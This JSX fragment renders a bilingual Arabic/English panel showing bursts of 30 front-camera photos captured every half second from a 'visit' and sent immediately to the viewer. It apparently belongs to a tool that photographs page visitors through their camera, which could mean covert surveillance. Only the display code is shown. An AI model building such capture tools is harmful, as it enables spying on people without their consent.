            ...
            <div className="flex items-center gap-2.5">
              ...
              <div>
                <h4 className="text-xs sm:text-sm font-black uppercase tracking-wider text-white flex items-center gap-2 flex-wrap">
                  <span>{lang === 'ar' ? 'قسم التقاط صور الكاميرا الأمامية فقط (30 صورة)' : 'Front Camera Only Photo Captures (30 Photos)'}</span>
                  <span className="px-2 py-0.5 rounded-full text-[11px] font-black bg-rose-600 text-white shadow-xs">
                    {currentCount} / 30 {lang === 'ar' ? 'صورة' : 'photos'}
                  </span>
                  {currentCount > 0 && (
                ...
                <p className="text-[11px] text-neutral-400 font-medium mt-0.5">
                  {lang === 'ar' ? 'التقاط 30 صورة حية من الكاميرا الأمامية فقط كل 0.5 ثانية، يتم إرسالها فوراً بمجرد التقاطها' : 'Capturing 30 front-only photos at 0.5s intervals, sent immediately as they are captured.'}
                </p>
              </div>
            </div>
          ...
          {(!visit.capturedPhotos || visit.capturedPhotos.length === 0) ? (
            <div className="flex flex-col items-center justify-center py-12 px-4 rounded-xl border border-dashed border-neutral-800 bg-neutral-900/50 text-center gap-2.5">
              ...
              <p className="text-sm font-bold text-neutral-200">
                {lang === 'ar' ? 'جاري التقاط صور الكاميرا الأمامية كل 0.5 ثانية...' : 'Waiting for incoming front camera photo burst...'}
              </p>
              <p className="text-xs text-neutral-400">
                {lang === 'ar' ? 'تظهر صور الكاميرا الأمامية فور التقاطها مباشرة هنا بعد التحقق من سطوع الصورة مع زر تنزيل لكل صورة وزر تحميل الكل' : 'Front camera photos stream in every 500ms as they are captured'}
              </p>
            </div>
          ) : galleryViewMode === 'cinema' ? (
